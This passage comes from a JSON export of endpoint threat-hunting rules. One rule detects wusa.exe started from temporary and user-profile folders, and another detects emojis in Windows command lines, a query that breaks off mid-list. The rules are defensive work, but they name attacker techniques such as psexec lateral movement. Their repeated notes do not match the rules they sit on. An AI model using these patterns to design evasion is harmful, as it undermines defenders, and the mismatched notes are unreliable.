            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\wusa.exe\" and ((src.process.image.path contains \":\\Perflogs\\\" or src.process.image.path contains \":\\Users\\Public\\\" or src.process.image.path contains \":\\Windows\\Temp\\\" or src.process.image.path contains \"\\Appdata\\Local\\Temp\\\" or src.process.image.path contains \"\\Temporary Internet\") or ((src.process.image.path contains \":\\Users\\\" and src.process.image.path contains \"\\Favorites\\\") or (src.process.image.path contains \":\\Users\\\" and src.process.image.path contains \"\\Favourites\\\") or (src.process.image.path contains \":\\Users\\\" and src.process.image.path contains \"\\Contacts\\\") or (src.process.image.path contains \":\\Users\\\" and src.process.image.path contains \"\\Pictures\\\"))) and (not tgt.process.cmdline contains \".msu\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 243
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage of emojis in the command line, this could be a sign of potential defense evasion activity.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potential Defense Evasion Activity Via Emoji Usage In CommandLine - 4",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\ud83d\udd38\" or tgt.process.cmdline contains \"\ud83d\udd39\" or tgt.process.cmdline contains \"\ud83d\udd36\" or tgt.process.cmdline contains \"\ud83d\udd37\" or tgt.process.cmdline contains \"\ud83d\udd33\" or tgt.process.cmdline contains \"\ud83d\udd32\" or tgt.process.cmdline contains \"\u25aa\ufe0f\" or tgt.process.cmdline contains \"\u25ab\ufe0f\" or tgt.process.cmdline contains \"\u25fe\ufe0f\" or tgt.process.cmdline contains \"\u25fd\ufe0f\" or tgt.process.cmdline contains \"\u25fc\ufe0f\" or tgt.process.cmdline contains \"\u25fb\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udfe5\" or tgt.process.cmdline contains \"\ud83d\udfe7\" or tgt.process.cmdline contains \"\ud83d\udfe8\" or tgt.process.cmdline contains \"\ud83d\udfe9\" or tgt.process.cmdline contains \"\ud83d\udfe6\" or tgt.process.cmdline contains \"\ud83d\udfea\" or tgt.process.cmdline contains \"\u2b1b\ufe0f\" or tgt.process.cmdline contains \"\u2b1c\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udfeb\" or tgt.process.cmdline contains \"\ud83d\udd08\" or tgt.process.cmdline contains \"\ud83d\udd07\" or tgt.process.cmdline contains \"\ud83d\udd09\" or tgt.process.cmdline contains \"\ud83d\udd0a\" or tgt.process.cmdline contains \"\ud83d\udd14\" or tgt.process.cmdline contains \"\ud83d\udd15\" or tgt.process.cmdline contains \"\ud83d\udce3\" or tgt.process.cmdline contains \"\ud83d\udce2\" or tgt.process.cmdline contains \"\ud83d\udc41\u200d\ud83d\udde8\" or tgt.process.cmdline contains \"\ud83d\udcac\" or tgt.process.cmdline contains \"\ud83d\udcad\" or tgt.process.cmdline contains \"\ud83d\uddef\" or tgt.process.cmdline contains \"\u2660\ufe0f\" or tgt.process.cmdline contains \"\u2663\ufe0f\" or tgt.process.cmdline contains \"\u2665\ufe0f\" or tgt.process.cmdline contains \"\u2666\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udccf\" or tgt.process.cmdline contains \"\ud83c\udfb4\" or tgt.process.cmdline contains \"\ud83c\udc04\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd50\" or tgt.process.cmdline contains \"\ud83d\udd51\" or tgt.process.cmdline contains \"\ud83d\udd52\" or tgt.process.cmdline contains \"\ud83d\udd53\" or tgt.process.cmdline contains \"\ud83d\udd54\" or tgt.process.cmdline contains \"\ud83d\udd55\" or tgt.process.cmdline contains \"\ud83d\udd56\" or tgt.process.cmdline contains \"\ud83d\udd57\" or tgt.process.cmdline contains \"\ud83d\udd58\" or tgt.process.cmdline contains \"\ud83d\udd59\" or tgt.process.cmdline contains \"\ud83d\udd5a\" or tgt.process.cmdline contains \"\ud83d\udd5b\" or tgt.process.cmdline contains \"\ud83d\udd5c\" or tgt.process.cmdline contains \"\ud83d\udd5d\" or tgt.process.cmdline contains \"\ud83d\udd5e\" or tgt.process.cmdline contains \"\ud83d\udd5f\" or tgt.process.cmdline contains \"\ud83d\udd60\" or tgt.process.cmdline contains \"\ud83d\udd61\" or tgt.process.cmdline contains \"\ud83d\udd62\" or tgt.process.cmdline contains \"\ud83d\udd63\" or tgt.process.cmdline contains \"\ud83d\udd64\" or tgt.process.cmdline contains \"\ud83d\udd65\" or tgt.process.cmdline contains \"\ud83d\udd66\" or tgt.process.cmdline contains \"\ud83d\udd67\u2722\" or tgt.process.cmdline contains \"\u2723\" or tgt.process.cmdline contains \"\u2724\" or tgt.process.cmdline contains \"\u2725\" or tgt.process.cmdline contains \"\u2726\" or tgt.process.cmdline contains \"\u2727\" or tgt.process.cmdline contains \"\u2605\" or tgt.process.cmdline contains \"\u2606\" or tgt.process.cmdline contains \"\u272f\" or tgt.process.cmdline contains \"\u2721\ufe0e\" or tgt.process.cmdline contains \"\u2729\" or tgt.process.cmdline contains \"\u272a\" or tgt.process.cmdline contains \"\u272b\" or tgt.process.cmdline contains \"\u272c\" or tgt.process.cmdline contains \"\u272d\" or tgt.process.cmdline contains \"\u272e\" or tgt.process.cmdline contains \"\u2736\" or tgt.process.cmdline contains \"\u2737\" or tgt.process.cmdline contains \"\u2735\" or tgt.process.cmdline contains \"\u2738\" or tgt.process.cmdline contains \"\u2739\" or tgt.process.cmdline contains \"\u2192\" or tgt.process.cmdline contains \"\u21d2\" or tgt.process.cmdline contains \"\u27f9\" or tgt.process.cmdline contains \"\u21e8\" or tgt.process.cmdline contains \"\u21fe\" or tgt.process.cmdline contains \"\u27be\" or tgt.process.cmdline contains \"\u21e2\" or tgt.process.cmdline contains \"\u261b\" or tgt.process.cmdline contains \"\u261e\" or tgt.process.cmdline contains \"\u2794\" or tgt.process.cmdline contains \"\u279c\" or tgt.process.cmdline contains \"\u2799\" or tgt.process.cmdline contains \"\u279b\" or tgt.process.cmdline contains \"\u279d\" or tgt.process.cmdline contains \"\u279e\" or tgt.process.cmdline contains \"\u2660\ufe0e\" or tgt.process.cmdline contains \"\u2663\ufe0e\" or tgt.process.cmdline contains \"\u2665\ufe0e\" or tgt.process.cmdline contains \"\u2666\ufe0e\" or tgt.process.cmdline contains \"\u2664\" or tgt.process.cmdline contains \"\u2667\" or tgt.process.cmdline contains \"\u2661\" or tgt.process.cmdline contains \"\u2662\" or tgt.process.cmdline contains \"\u265a\" or tgt.process.cmdline contains \"\u265b\" or tgt.process.cmdline contains \"\u265c\" or tgt.process.cmdline contains \"\u265d\" or tgt.process.cmdline contains \"\u265e\" or tgt.process.cmdline contains \"\u265f\" or tgt.process.cmdline contains \"\u2654\" or tgt.process.cmdline contains \"\u2655\" or tgt.process.cmdline contains \"\u2656\" or tgt.process.cmdline contains \"\u2657\" or tgt.process.cmdline contains \"\u2658\" or tgt.process.cmdline contains \"\u2659\" or tgt.process.cmdline contains \"\u2680\" or tgt.process.cmdline contains \"\u2681\" or tgt.process.cmdline contains \"\u2682\" or tgt.process.cmdline contains \"\u2683\" or tgt.process.cmdline contains \"\u2684\" or tgt.process.cmdline contains \"\u2685\" or tgt.process.cmdline contains \"\ud83c\udca0\" or tgt.process.cmdline contains \"\u2688\" or tgt.process.cmdline contains \"\u2689\" or tgt.process.cmdline contains \"\u2686\" or tgt.process.cmdline contains \"\u2687\" or tgt.process.cmdline contains \"\ud80c\udc00\" or tgt.process.cmdline contains \"\ud80c\udc01\" or tgt.process.cmdline contains \"\ud80c\udc02\" or tgt.process.cmdline contains \"\ud80c\udc03\" or tgt.process.cmdline contains \"\ud80c\udc04\" or tgt.process.cmdline contains \"\ud80c\udc05\" or tgt.process.cmdline contains \"\ud80c\udc06\" or tgt.process.cmdline contains \"\ud80c\udc07\" or tgt.process.cmdline contains \"\ud80c\udc08\" or tgt.process.cmdline contains \"\ud80c\udc09\" or tgt.process.cmdline contains \"\ud80c\udc0a\" or tgt.process.cmdline contains \"\ud80c\udc0b\" or tgt.process.cmdline contains \"\ud80c\udc0c\" or tgt.process.cmdline contains \"\ud80c\udc0d\" or tgt.process.cmdline contains \"\ud80c\udc0e\" or tgt.process.cmdline contains \"\ud80c\udc0f\" or tgt.process.cmdline contains \"\ud80c\udc10\" or tgt.process.cmdline contains \"\ud80c\udc11\" or tgt.process.cmdline contains \"\ud80c\udc12\" or tgt.process.cmdline contains \"\ud80c\udc13\" or tgt.process.cmdline contains \"\ud80c\udc14\" or tgt.process.cmdline contains \"\ud80c\udc15\" or tgt.process.cmdline contains \"\ud80c\udc16\" or tgt.process.cmdline contains \"\ud80c\udc17\" or tgt.process.cmdline contains \"\ud80c\udc18\" or tgt.process.cmdline contains \"\ud80c\udc19\" or tgt.process.cmdline contains \"\ud80c\udc1a\" or tgt.process.cmdline contains \"\ud80c\udc1b\" or tgt.process.cmdline contains \"\ud80c\udc1c\" or tgt.process.cmdline contains \"\ud80c\udc1d\ud83c\udff3\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udff4\" or tgt.process.cmdline contains \"\ud83c\udfc1\" or tgt.process.cmdline contains \"\ud83d\udea9\" or tgt.process.cmdline contains \"\ud83c\udff3\ufe0f\u200d\ud83c\udf08\" or tgt.process.cmdline contains \"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udff4\u200d\u2620\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddeb\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddfd\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddf1\" or tgt.process.cmdline contains \"\ud83c\udde9\ud83c\uddff\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\udde9\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddee\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddf6\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddfc\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddfa\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddff\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\udded\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\udde9\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\udde7\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddfe\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddff\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddef\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddfc\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\uddfb\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddeb\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddee\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\udded\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\udde8\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddfb\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddf6\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\uddfe\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddeb\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\udde9\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddf1\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddfd\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\udde8\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\udde9\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddf0\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddee\" or tgt.process.cmdline contains \"\ud83c\udded\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddfa\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddfc\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddfe\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddff\" or tgt.process.cmdline contains \"\ud83c\udde9\ud83c\uddf0\" or tgt.process.cmdline contains \"\ud83c\udde9\ud83c\uddef\" or tgt.process.cmdline contains \"\ud83c\udde9\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\udde9\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\uddea\ud83c\udde8\" or tgt.process.cmdline contains \"\ud83c\uddea\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddfb\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddf6\" or tgt.process.cmdline contains \"\ud83c\uddea\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddea\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddea\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\uddea\ud83c\uddfa\" or tgt.process.cmdline contains \"\ud83c\uddeb\ud83c\uddf0\" or tgt.process.cmdline contains \"\ud83c\uddeb\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\uddeb\ud83c\uddef\" or tgt.process.cmdline contains \"\ud83c\uddeb\ud83c\uddee\" or tgt.process.cmdline contains \"\ud83c\uddeb\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddeb\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddeb\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddeb\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\udde9\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\udded\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddee\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddf1\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\udde9\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddf5\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddfa\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddfc\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddfe\" or tgt.process.cmdline contains \"\ud83c\udded\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\udded\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\udded\ud83c\uddf0\" or tgt.process.cmdline contains \"\ud83c\udded\ud83c\uddfa\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\udde9\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\uddf6\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\uddf1\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\uddef\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\uddef\ud83c\uddf5\" or tgt.process.cmdline contains \"\ud83c\udf8c\" or tgt.process.cmdline contains \"\ud83c\uddef\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddef\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\uddff\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\uddee\" or tgt.process.cmdline contains \"\ud83c\uddfd\ud83c\uddf0\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\uddfc\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\uddfb\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\udde7\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\uddfe\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\uddee\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\uddfa\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddf0\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddfc\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddfe\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddfb\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddf1\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\udded\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddf6\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddfa\" or tgt.process.cmdline contains \"\ud83c\uddfe\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddfd\" or tgt.process.cmdline contains \"\ud83c\uddeb\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\udde9\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\udde8\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddff\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\uddf5\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\uddf1\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\udde8\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\uddff\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\uddee\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\uddfa\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\uddeb\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\uddf5\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddf5\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\uddf4\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddf0\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddfc\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddfe\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\udded\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddf1\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddf6\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\uddf7\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddf7\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\uddf7\ud83c\uddfa\" or tgt.process.cmdline contains \"\ud83c\uddf7\ud83c\uddfc\" or tgt.process.cmdline contains \"\ud83c\uddfc\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\uddf7\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\udde8\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddf1\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddfd\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddf0\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddee\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\udde7\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\uddff\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\uddea\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\uddf0\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddf1\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\udded\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\udde8\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\uddfb\ud83c\udde8\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\udde9\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddff\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\udded\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddfe\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddfc\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddef\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddff\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\udded\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddf1\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddf0\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\udde8\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddfb\" or tgt.process.cmdline contains \"\ud83c\uddfb\ud83c\uddee\" or tgt.process.cmdline contains \"\ud83c\uddfa\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\uddfa\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\udde7\" or tgt.process.cmdline contains \"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f\" or tgt.process.cmdline contains \"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc73\udb40\udc63\udb40\udc74\udb40\udc7f\" or tgt.process.cmdline contains \"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc77\udb40\udc6c\udb40\udc73\udb40\udc7f\" or tgt.process.cmdline contains \"\ud83c\uddfa\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\uddfa\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\uddfa\ud83c\uddfe\" or tgt.process.cmdline contains \"\ud83c\uddfa\ud83c\uddff\" or tgt.process.cmdline contains \"\ud83c\uddfb\ud83c\uddfa\" or tgt.process.cmdline contains \"\ud83c\uddfb\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\uddfb\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddfb\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\uddfc\ud83c\uddeb\" or tgt.process.cmdline contains \"\ud83c\uddea\ud83c\udded\" or tgt.process.cmdline contains \"\ud83c\uddfe\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddff\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\uddff\ud83c\uddfc\ud83e\udee0\" or tgt.process.cmdline contains \"\ud83e\udee2\" or tgt.process.cmdline contains \"\ud83e\udee3\" or tgt.process.cmdline contains \"\ud83e\udee1\" or tgt.process.cmdline contains \"\ud83e\udee5\" or tgt.process.cmdline contains \"\ud83e\udee4\" or tgt.process.cmdline contains \"\ud83e\udd79\" or tgt.process.cmdline contains \"\ud83e\udef1\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef2\" or tgt.process.cmdline contains 